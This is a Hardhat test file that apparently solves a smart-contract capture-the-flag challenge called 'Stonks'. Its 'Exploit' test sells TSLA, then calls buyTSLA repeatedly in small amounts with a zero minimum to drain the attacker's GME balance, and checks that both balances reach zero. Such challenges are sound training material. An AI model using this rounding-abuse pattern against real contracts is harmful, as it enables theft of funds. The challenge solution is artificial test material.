const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Stonks", function () {
  let deployer, attacker;

  before(async function () {
    [deployer, attacker] = await ethers.getSigners();

    this.Stonks = await (
      await ethers.getContractFactory("Stonks", deployer)
    ).deploy(attacker.address);
    await this.Stonks.deployed();
  });

  it("Exploit", async function () {
    let amountOfTSLA = await this.Stonks.balanceOf(
      attacker.address,
      await this.Stonks.TSLA()
    );
    let Oracle = await this.Stonks.ORACLE_TSLA_GME();

    let tx = await this.Stonks.connect(attacker).sellTSLA(
      amountOfTSLA,
      Oracle * amountOfTSLA
    );
    await tx.wait();

    while (
      (await this.Stonks.balanceOf(attacker.address, await this.Stonks.GME())) >
      49
    ) {
      tx = await this.Stonks.connect(attacker).buyTSLA(49, 0);
      await tx.wait();
    }
    tx = await this.Stonks.connect(attacker).buyTSLA(
      await this.Stonks.balanceOf(attacker.address, await this.Stonks.GME()),
      0
    );
    await tx.wait();
  });

  after(async function () {
    expect(
      await this.Stonks.balanceOf(attacker.address, await this.Stonks.GME())
    ).to.be.eq(0, "You have GME!");
    expect(
      await this.Stonks.balanceOf(attacker.address, await this.Stonks.TSLA())
    ).to.be.eq(0, "You have TSLA!");
  });
});
